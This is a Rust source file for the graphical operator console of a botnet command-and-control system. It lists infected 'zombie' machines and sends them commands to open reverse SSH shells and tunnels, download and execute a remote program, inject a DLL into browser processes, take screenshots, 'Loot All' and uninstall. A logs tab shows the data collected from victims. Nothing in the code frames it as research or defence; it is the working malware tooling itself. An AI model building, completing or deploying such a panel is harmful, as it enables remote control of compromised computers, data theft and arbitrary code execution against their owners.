use std::process::id;

use eframe::{egui, glow::NONE};
use egui::{LayerId, Response, Window};
use p256::elliptic_curve::bigint::Random;
use serde::{Deserialize, Serialize};
use serde_json::json;
use sqlx::types::{ipnetwork::IpNetwork, uuid::Timestamp, Uuid};
use rand::Rng;

enum Tab {
    Zombies,
    Logs,
    Settings,
}

#[derive(Deserialize)]
pub struct LoginResponse {
    pub token: String,
}

#[derive(Deserialize)]
struct ZombieRow {
    id: String,
    internal_ip: Option<IpNetwork>,
    external_ip: Option<IpNetwork>,
    hostname: Option<String>,
    username: Option<String>,
    operating_system: Option<String>,
}

#[derive(Deserialize)]
struct ZombieUpdateResponse {
    data: Vec<ZombieRow>,
}

#[derive(Serialize)]
struct Command {
    uid: String,
    prev: i64,
    nonce: i64,
    command: String,
    signature: String,
}

#[derive(Deserialize)]
struct CreateCommandRow {
    id: i32,
}

#[derive(Deserialize)]
struct LogRow {
    id: i32,
    uid: String,
    key: String,
    value: String,
}

#[derive(Deserialize)]
struct LogResponse {
    data: Vec<LogRow>,
}

#[derive(serde::Deserialize, serde::Serialize)]
#[serde(default)]
pub struct App {
    #[serde(skip)]
    command_id: u8,

    #[serde(skip)]
    current_command: Command,

    #[serde(skip)]
    needs_update: bool,

    #[serde(skip)]
    tab: Tab,

    #[serde(skip)]
    selected_row: Option<usize>,

    #[serde(skip)]
    context_menu_id: Option<usize>,

    #[serde(skip)]
    zombies: Vec<ZombieRow>,

    #[serde(skip)]
    logs: Vec<LogRow>,

    #[serde(skip)]
    response: Option<Response>,

    #[serde(skip)]
    window_open: bool,

    backend_url: String,
    username: String,
    password: String,
    access_token: String,
    status_message: String,
    zombie_message: String,
    ssh_host: String,
    ssh_port: String,
    remote_port: String,
    local_port: String,
    exe_download: String,
    browser_process: String,
    dll_link: String,
    duration: String,
}

impl Default for App {
    fn default() -> Self {
        Self {
            command_id: 0,
            current_command: Command { uid: "".to_string(), prev: 0, nonce: 0, command: "".to_string(), signature:"".to_string() },
            needs_update: true,
            tab: Tab::Zombies,
            selected_row: None,
            context_menu_id: None,
            zombies: vec![],
            logs: vec![],
            response: None,
            window_open: false,
            backend_url: "https://localhost:3000/api".to_owned(),
            username: "User".to_owned(),
            password: "123456".to_owned(),
            access_token: "".to_owned(),
            status_message: "Not logged in!".to_owned(),
            zombie_message: "".to_owned(),
            ssh_host: "123.123.123.123".to_owned(),
            ssh_port: "443".to_owned(),
            remote_port: "80".to_owned(),
            local_port: "8080".to_owned(),
            exe_download: "https://download.me/file.exe".to_owned(),
            browser_process: "firefox.exe".to_owned(),
            dll_link: "https://example.com/lib.dll".to_owned(),
            duration: "120".to_owned(),
        }
    }
}

impl App {
    pub fn new(cc: &eframe::CreationContext<'_>) -> Self {
        if let Some(storage) = cc.storage {
            return eframe::get_value(storage, eframe::APP_KEY).unwrap_or_default();
        }
        Default::default()
    }
}

impl eframe::App for App {
    fn save(&mut self, storage: &mut dyn eframe::Storage) {
        eframe::set_value(storage, eframe::APP_KEY, self);
    }

    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {

        if self.window_open && self.command_id != 255 {
            egui::Window::new("Command Options")
                .open(&mut self.window_open)
                .show(ctx, |ui| {
                    if self.command_id == 0 {
                        ui.label("Command: Open SSH");
                        ui.horizontal(|ui| {
                            ui.label("SSH Server: ");
                            ui.text_edit_singleline(&mut self.ssh_host);
                        });
                        ui.horizontal(|ui| {
                            ui.label("SSH Port: ");
                            ui.text_edit_singleline(&mut self.ssh_port);
                        });
                        if ui.button("Open Reverse SSH Connection").clicked() {
                            // build the command
                            self.current_command.command = format!("{}P{}H{}", "00", &self.ssh_host, &self.ssh_port);
                            self.zombie_message = send_command(ui, self.backend_url.clone(), self.access_token.clone(), &mut self.current_command);
                        }
                    }
                    else if self.command_id == 1 {
                        ui.label("Command: Close SSH");
                        if ui.button("Close All Reverse Shells").clicked() {
                            // build the command
                            self.current_command.command = format!("{}", "01");
                            self.zombie_message = send_command(ui, self.backend_url.clone(), self.access_token.clone(), &mut self.current_command);
                        }
                    }
                    else if self.command_id == 2 {
                        ui.label("Command: Open Tunnel");
                        ui.horizontal(|ui| {
                            ui.label("SSH Server: ");
                            ui.text_edit_singleline(&mut self.ssh_host);
                        });
                        ui.horizontal(|ui| {
                            ui.label("Remote Port: ");
                            ui.text_edit_singleline(&mut self.remote_port);
                        });
                        ui.horizontal(|ui| {
                            ui.label("Local Port: ");
                            ui.text_edit_singleline(&mut self.local_port);
                        });
                        if ui.button("Send Command").clicked() {
                            // build the command
                            self.current_command.command = format!("{}L{}R{}H{}", "02", &self.local_port, &self.remote_port, &self.ssh_host);
                            self.zombie_message = send_command(ui, self.backend_url.clone(), self.access_token.clone(), &mut self.current_command);
                        }
                    }
                    else if self.command_id == 3 {
                        ui.label("Command: Close Tunels");
                        if ui.button("Close all Tunneled Ports").clicked() {
                            // build the command
                            self.current_command.command = format!("{}", "03");
                            self.zombie_message = send_command(ui, self.backend_url.clone(), self.access_token.clone(), &mut self.current_command);
                        }
                    }
                    else if self.command_id == 4 {
                        ui.label("Command: Download and Execute");
                        ui.horizontal(|ui| {
                            ui.label("Direct Link: ");
                            ui.text_edit_singleline(&mut self.exe_download);
                        });
                        if ui.button("Execute Program").clicked() {
                            // build the command
                            self.current_command.command = format!("{}E{}", "04", &self.exe_download);
                            self.zombie_message = send_command(ui, self.backend_url.clone(), self.access_token.clone(), &mut self.current_command);
                        }
                    }
                    else if self.command_id == 5 {
                        ui.label("Command: Infect Browsers");
                        ui.horizontal(|ui| {
                            ui.label("Process to infect: ");
                            ui.text_edit_singleline(&mut self.browser_process);
                        });
                        ui.horizontal(|ui| {
                            ui.label("direct dll/so link: ");
                            ui.text_edit_singleline(&mut self.dll_link);
                        });
                        if ui.button("Inject Library").clicked() {
                            // build the command
                            self.current_command.command = format!("{}P{} L{}", "05", &self.browser_process, &self.dll_link);
                            self.zombie_message = send_command(ui, self.backend_url.clone(), self.access_token.clone(), &mut self.current_command);
                        }
                    }
                    else if self.command_id == 6 {
                        ui.label("Command: Screenshot");
                        if ui.button("Take Screenshot").clicked() {
                            // build the command
                            self.current_command.command = format!("{}", "06");
                            self.zombie_message = send_command(ui, self.backend_url.clone(), self.access_token.clone(), &mut self.current_command);
                        }
                    }
                    else if self.command_id == 7 {
                        ui.label("Command: Loot All");
                        if ui.button("Loot All").clicked() {
                            // build the command
                            self.current_command.command = format!("{}", "07");
                            self.zombie_message = send_command(ui, self.backend_url.clone(), self.access_token.clone(), &mut self.current_command);
                        }
                    }
                    else if self.command_id == 8 {
                        ui.label("Command: Sleep for Minutes");
                        ui.horizontal(|ui| {
                            ui.label("Duration: ");
                            ui.text_edit_singleline(&mut self.duration);
                        });
                        if ui.button("Send Command").clicked() {
                            // build the command
                            self.current_command.command = format!("{}D{}", "08", &self.duration);
                            self.zombie_message = send_command(ui, self.backend_url.clone(), self.access_token.clone(), &mut self.current_command);
                        }
                    }
                    else if self.command_id == 9 {
                        ui.label("Command: Uninstall");
                        ui.label("There no options here! Confirmation only!");
                        if ui.button("Uninstall").clicked() {
                            // build the command
                            self.current_command.command = format!("{}", "09");
                            self.zombie_message = send_command(ui, self.backend_url.clone(), self.access_token.clone(), &mut self.current_command);
                        }
                    }
                });
        }

        egui::TopBottomPanel::top("top_panel").show(ctx, |ui| {
            egui::menu::bar(ui, |ui| {
                ui.menu_button("Zombies", |_ui| {
                    self.tab = Tab::Zombies;
                });
                ui.menu_button("Logs", |_ui| {
                    self.tab = Tab::Logs;
                });
                ui.menu_button("Settings", |_ui| {
                    self.tab = Tab::Settings;
                });
            });
        });

        egui::CentralPanel::default().show(ctx, |ui| {
            match self.tab {
                Tab::Zombies => zombies_ui(ui, self),
                Tab::Logs => logs_ui(ui, self),
                Tab::Settings => settings_ui(ui, self),
            }
        });
    }
}


fn send_command(ui: &mut egui::Ui, base_url: String, access_token: String, cmd: &mut Command) -> String {
    // sign the command
    let sign = "123456";
    cmd.signature = sign.to_owned();

    // send the command
    let http_client = reqwest::blocking::Client::new();
    let res = http_client.post(format!("{}/command", base_url))
    .bearer_auth(access_token)
    .json(&cmd)
    .send();

    if res.is_ok() {
        let res = res.unwrap().json();
        if res.is_ok() {
            let res : CreateCommandRow = res.unwrap();
            return format!("Command created with id: {}", res.id);
        } else {
            return format!("Failed: {}", res.err().unwrap().to_string());
        }
    } else {
        return format!("Failed: {}", res.err().unwrap().to_string());
    }
}

fn zombies_ui(ui: &mut egui::Ui, app: &mut App) {

    if ui.button("Update Zombie List").clicked() {
        app.needs_update = true;
    }

    ui.label(&app.zombie_message);
    
   // static header
   egui::Grid::new("zm_header")
   .num_columns(7)
   .min_col_width(100.0)
   .max_col_width(100.0)
   .striped(false)
   .show(ui, |ui| {
       ui.label(egui::RichText::new("INT. IP").color(egui::Color32::LIGHT_BLUE).text_style(egui::TextStyle::Button));
       ui.label(egui::RichText::new("EXT. IP").color(egui::Color32::LIGHT_BLUE).text_style(egui::TextStyle::Button));
       ui.label(egui::RichText::new("HOSTNAME").color(egui::Color32::LIGHT_BLUE).text_style(egui::TextStyle::Button));
       ui.label(egui::RichText::new("USER").color(egui::Color32::LIGHT_BLUE).text_style(egui::TextStyle::Button));
       ui.label(egui::RichText::new("OS").color(egui::Color32::LIGHT_BLUE).text_style(egui::TextStyle::Button));
       //ui.label(egui::RichText::new("STATUS").color(egui::Color32::LIGHT_BLUE).text_style(egui::TextStyle::Button));
       ui.label(egui::RichText::new("Action").color(egui::Color32::LIGHT_BLUE).text_style(egui::TextStyle::Button));
       ui.end_row();
   });

   // dynamic user list
   egui::ScrollArea::vertical()
   .max_width(f32::INFINITY)
   .auto_shrink(false)
   .show(ui, |ui| {
       egui::Grid::new("zombies")
           .num_columns(7)
           .min_col_width(100.0)
           .max_col_width(100.0)
           .striped(true)
           .show(ui, |ui| {
                if app.needs_update && app.access_token.len() > 1 {
                    let http_client = reqwest::blocking::Client::new();
                    let res = http_client.get(format!("{}/update", app.backend_url))
                        .bearer_auth(&app.access_token)
                        .send();

                    if res.is_ok() {
                        let res = res.unwrap().json();

                        if res.is_ok() {
                            let updated: ZombieUpdateResponse = res.unwrap();

                            app.zombies = updated.data;
                            app.needs_update = false;
                            app.zombie_message = "Zombies updated!".to_owned();
                        } else {
                            app.needs_update = false;
                            app.zombie_message = format!("Failed: {}", res.err().unwrap().to_string());
                        }
                    } else {
                        app.needs_update = false;
                        app.zombie_message = "Connection to backend failed! Refresh the Token under 'Settings'!".to_owned();
                    }
                }

               //zombies
               let mut i: usize = 0;

               for z in &app.zombies {
                    let internal_ip: String = match z.internal_ip {
                        Some(net) => net.ip().to_string(),
                        None => "".to_string(),
                    };
                    
                    let external_ip: String = match z.external_ip {
                        Some(net) => net.ip().to_string(),
                        None => "".to_string(),
                    };

                    let row = vec![ 
                        internal_ip.clone(),
                        external_ip.clone(),
                        z.hostname.clone().unwrap_or("-".to_string()),
                        z.username.clone().unwrap_or("-".to_string()),
                        z.operating_system.clone().unwrap_or("-".to_string()),
                        //"ONLINE".to_string(),
                    ];
                    
                    for col_text in row.iter() {
                        let (rect, _response) = ui.allocate_exact_size([100.0, 15.0].into(), egui::Sense::click());
                        ui.painter().text(
                            rect.left_center(),
                            egui::Align2::LEFT_CENTER,
                            col_text,
                            egui::FontId::default(),
                            ui.visuals().text_color(),
                        );
                    }
                    
                    let mut rng = rand::thread_rng();
                    ui.menu_button("Action", |ui| {
                        if ui.button("Open SSH").clicked() {
                            app.command_id = 0;
                            app.current_command.uid = z.id.clone();
                            app.current_command.nonce = rng.gen::<i64>();
                            app.window_open = true;
                            ui.close_menu();
                        }
                        if ui.button("Close SSH").clicked() {
                            app.command_id = 1;
                            app.current_command.uid = z.id.clone();
                            app.current_command.nonce = rng.gen::<i64>();
                            app.window_open = true;
                            ui.close_menu();
                        }
                        if ui.button("Open Tunnel").clicked() {
                            app.command_id = 2;
                            app.current_command.uid = z.id.clone();
                            app.current_command.nonce = rng.gen::<i64>();
                            app.window_open = true;
                            ui.close_menu();
                        }
                        if ui.button("Close Tunnels").clicked() {
                            app.command_id = 3;
                            app.current_command.uid = z.id.clone();
                            app.current_command.nonce = rng.gen::<i64>();
                            app.window_open = true;
                            ui.close_menu();
                        }
                        ui.separator();
                        if ui.button("Download and Execute").clicked() {
                            app.command_id = 4;
                            app.current_command.uid = z.id.clone();
                            app.current_command.nonce = rng.gen::<i64>();
                            app.window_open = true;
                            ui.close_menu();
                        }
                        if ui.button("Infect Browsers").clicked() {
                            app.command_id = 5;
                            app.current_command.uid = z.id.clone();
                            app.current_command.nonce = rng.gen::<i64>();
                            app.window_open = true;
                            ui.close_menu();
                        }
                        if ui.button("Screenshot").clicked() {
                            app.command_id = 6;
                            app.current_command.uid = z.id.clone();
                            app.current_command.nonce = rng.gen::<i64>();
                            app.window_open = true;
                            ui.close_menu();
                        }
                        if ui.button("Loot All").clicked() {
                            app.command_id = 7;
                            app.current_command.uid = z.id.clone();
                            app.current_command.nonce = rng.gen::<i64>();
                            app.window_open = true;
                            ui.close_menu();
                        }
                        ui.separator();
                        if ui.button("Sleep").clicked() {
                            app.command_id = 8;
                            app.current_command.uid = z.id.clone();
                            app.current_command.nonce = rng.gen::<i64>();
                            app.window_open = true;
                            ui.close_menu();
                        }
                        if ui.button("Uninstall").clicked() {
                            app.command_id = 9;
                            app.current_command.uid = z.id.clone();
                            app.current_command.nonce = rng.gen::<i64>();
                            app.window_open = true;
                            ui.close_menu();
                        }
                    });
                    i = i+1;
                    ui.end_row();
                }
           });
   });
}

fn settings_ui(ui: &mut egui::Ui, app: &mut App) {
    ui.heading("Backend Connection:").highlight();

    ui.horizontal(|ui| {
        ui.label("Backend URL: ");
        ui.text_edit_singleline(&mut app.backend_url);
    });

    ui.horizontal( |ui| {
        ui.label("Username: ");
        ui.text_edit_singleline(&mut app.username);
    });

    ui.horizontal( |ui| {
        ui.label("Password: ");
        ui.text_edit_singleline(&mut app.password);
    });

    if ui.button("Authorize").clicked() {
        let http_client = reqwest::blocking::Client::new();
        let url_base = &app.backend_url;
        let json = json!({
            "username": app.username,
            "password": app.password,
        });
        let res = http_client.post(format!("{}/login", url_base))
                .json(&json)
                .send();
        
        if res.is_ok(){
            let res = res.unwrap().json();

            if res.is_ok() {
                let res: LoginResponse = res.unwrap();
                app.access_token = res.token;
                app.status_message = format!(" Token: [{}]", &app.access_token);
            } else {
                app.status_message = "Login failed!".to_owned();
            }
        } else {
            app.status_message = "URL not reachable!".to_owned();
        }
    }

    ui.label(&app.status_message);
}

fn logs_ui(ui: &mut egui::Ui, app: &mut App) {
    if ui.button("Update Log List").clicked() {
        app.needs_update = true;
    }

    ui.label(&app.zombie_message);
    
   // static header
   egui::Grid::new("log_header")
   .num_columns(7)
   .min_col_width(300.0)
   .max_col_width(300.0)
   .striped(false)
   .show(ui, |ui| {
       ui.label(egui::RichText::new("ZOMBIE ID").color(egui::Color32::LIGHT_BLUE).text_style(egui::TextStyle::Button));
       ui.label(egui::RichText::new("DESCRIPTION").color(egui::Color32::LIGHT_BLUE).text_style(egui::TextStyle::Button));
       ui.label(egui::RichText::new("VALUE").color(egui::Color32::LIGHT_BLUE).text_style(egui::TextStyle::Button));
       ui.end_row();
   });

   // dynamic user list
   egui::ScrollArea::vertical()
   .max_width(f32::INFINITY)
   .auto_shrink(false)
   .show(ui, |ui| {
       egui::Grid::new("logs")
           .num_columns(7)
           .min_col_width(300.0)
           .max_col_width(300.0)
           .striped(true)
           .show(ui, |ui| {
                if app.needs_update && app.access_token.len() > 1 {
                    let http_client = reqwest::blocking::Client::new();
                    let res = http_client.get(format!("{}/log", app.backend_url))
                        .bearer_auth(&app.access_token)
                        .send();

                    if res.is_ok() {
                        let res = res.unwrap().json();

                        if res.is_ok() {
                            let log_response: LogResponse = res.unwrap();

                            app.logs = log_response.data;
                            app.needs_update = false;
                            app.zombie_message = "Logs updated!".to_owned();
                        } else {
                            app.needs_update = false;
                            app.zombie_message = format!("Failed: {}", res.err().unwrap().to_string());
                        }
                    } else {
                        app.needs_update = false;
                        app.zombie_message = format!("Failed: {}", res.err().unwrap().to_string());
                    }
                }

               //logs
               let mut i: usize = 0;
               for log in &app.logs {
                    let row = vec![ 
                        log.uid.clone(),
                        log.key.clone(),
                        log.value.clone(),
                    ];
                    
                    for col_text in row.iter() {
                        let (rect, _response) = ui.allocate_exact_size([100.0, 15.0].into(), egui::Sense::click());
                        ui.painter().text(
                            rect.left_center(),
                            egui::Align2::LEFT_CENTER,
                            col_text,
                            egui::FontId::default(),
                            ui.visuals().text_color(),
                        );
                    }
                    
                    i = i+1;
                    ui.end_row();
                }
           });
   });
}